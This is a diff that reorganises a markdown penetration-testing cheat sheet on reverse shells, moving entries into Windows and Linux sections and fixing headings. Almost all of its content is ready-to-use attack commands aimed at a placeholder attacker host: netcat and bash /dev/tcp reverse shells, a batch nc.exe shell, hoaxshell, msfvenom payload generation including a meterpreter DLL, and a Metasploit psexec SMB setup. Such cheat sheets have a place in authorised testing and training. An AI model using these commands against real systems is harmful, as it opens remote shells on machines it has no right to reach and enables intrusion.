@@ -23,7 +23,7 @@ Reverse shells are a good way to bypass firewalls. The drawback is that we need 
 
 **The code allows the attacker to send shell commands to the target server via a web page hosted on this server.**
 
-# Handlers
+# Reverse Shell Handlers
 
 ---
 
@@ -45,11 +45,11 @@ Reverse shells are a good way to bypass firewalls. The drawback is that we need 
  > **<font color=red>set payload</font> linux/x86/meterpreter/reverse_tcp**</br>
  > Handler for linux (efl) reverse shell.
 
-# Reverse Shell
+# Reverse Shell Multi
 
 ---
 
-### Ressources
+### Resources
 
 [PayloadsAllTheThings Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp)
 
@@ -63,24 +63,6 @@ Reverse shells are a good way to bypass firewalls. The drawback is that we need 
  > 
  > **<font color=red>nc -e /bin/bash</font> \[ATTACKER_IP\] \[ATTACKER_PORT\]**</br>
  > Reverse shell. 
-
----
-
-### BASH
-
-
- > 
- > **<font color=red>bash -i >& /dev/tcp/</font>\[ATTACKER_IP\]<font color=red>/</font>\[ATTACKER_PORT\] <font color=red>0>&1</font>**</br>
- > Reverse Shell.
-
----
-
-### BAT
-
-
- > 
- > **<font color=red>@echo off nc.exe</font> \[ATTACKER_IP\] \[ATTACKER_PORT\] <font color=red>-e cmd.exe</font>**</br>
- > Reverse Shell.
 
 ---
 
@@ -106,30 +88,31 @@ Fancy reverse shell:
 **[Pentestmonkey PHP Reverse Shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php)**
 Location on Kali: <font color=lightblue>/usr/share/webshells/php/php-reverse-shell.php</font>
 
----
+# Reverse Shell Windows
 
-### METASPLOIT
-
-
- > 
- > **<font color=red>use</font> <font color=lightblue>exploit/windows/smb/psexec</font>**
- > 
- > **<font color=red>set lhost</font> \[ATTACKER_IP\]**</br>
- > **<font color=red>set rhosts</font> \[TARGET_IP\]**</br>
- > **<font color=red>set smbdomain</font> \[TARGET_DOMAIN\]**</br>
- > **<font color=red>set smbuser </font>\[TARGET_USER\]**</br>
- > **<font color=red>set smbpass</font> \[TARGET_IP\]**</br>
- > **<font color=red>set payload </font>windows/x64/meterpreter/reverse_tcp**</br>
- > Create a reverse shell from a SMB share.
+## 
 
 ---
 
-### MSVENOM (Reverse Shell Generator)
+### BAT
 
 
  > 
- > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_OP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
- > Generate a Linux reverse shell.
+ > **<font color=red>@echo off nc.exe</font> \[ATTACKER_IP\] \[ATTACKER_PORT\] <font color=red>-e cmd.exe</font>**</br>
+ > Reverse Shell.
+
+---
+
+### HOAXSHELL
+
+
+ > 
+ > **<font color=red>sudo python3 hoaxshell.py -s</font> \[ATTACKER_IP\]**</br>
+ > Create a reverse shell payload (that utilizes `Invoke-Expression`) and start a handler.
+
+---
+
+### MSVENOM
 
 
  > 
@@ -143,6 +126,42 @@ Location on Kali: <font color=lightblue>/usr/share/webshells/php/php-reverse-she
  > 
  > **<font color=red>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=</font>\[ATTACKER_IP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\] <font color=red>-f dll -o</font> shell<font color=red>.dll</font>**</br>
  > Generate a meterpreter reverse shell DLL.
+
+---
+
+### METASPLOIT (SMB)
+
+
+ > 
+ > **<font color=red>use</font> <font color=lightblue>exploit/windows/smb/psexec</font>**
+ > 
+ > **<font color=red>set lhost</font> \[ATTACKER_IP\]**</br>
+ > **<font color=red>set rhosts</font> \[TARGET_IP\]**</br>
+ > **<font color=red>set smbdomain</font> \[TARGET_DOMAIN\]**</br>
+ > **<font color=red>set smbuser </font>\[TARGET_USER\]**</br>
+ > **<font color=red>set smbpass</font> \[TARGET_IP\]**</br>
+ > **<font color=red>set payload </font>windows/x64/meterpreter/reverse_tcp**</br>
+ > Create a reverse shell from a SMB share.
+
+# Reverse Shell Linux
+
+---
+
+### BASH
+
+
+ > 
+ > **<font color=red>bash -i >& /dev/tcp/</font>\[ATTACKER_IP\]<font color=red>/</font>\[ATTACKER_PORT\] <font color=red>0>&1</font>**</br>
+ > Reverse Shell.
+
+---
+
+### MSVENOM
+
+
+ > 
+ > **<font color=red>msfvenom -p cmd/unix/reverse_netcat LHOST=</font>\[ATTACKER_OP\] <font color=red>LPORT=</font>\[ATTACKER_PORT\]**</br>
+ > Generate a Linux reverse shell.
 
 # Web Shell
 
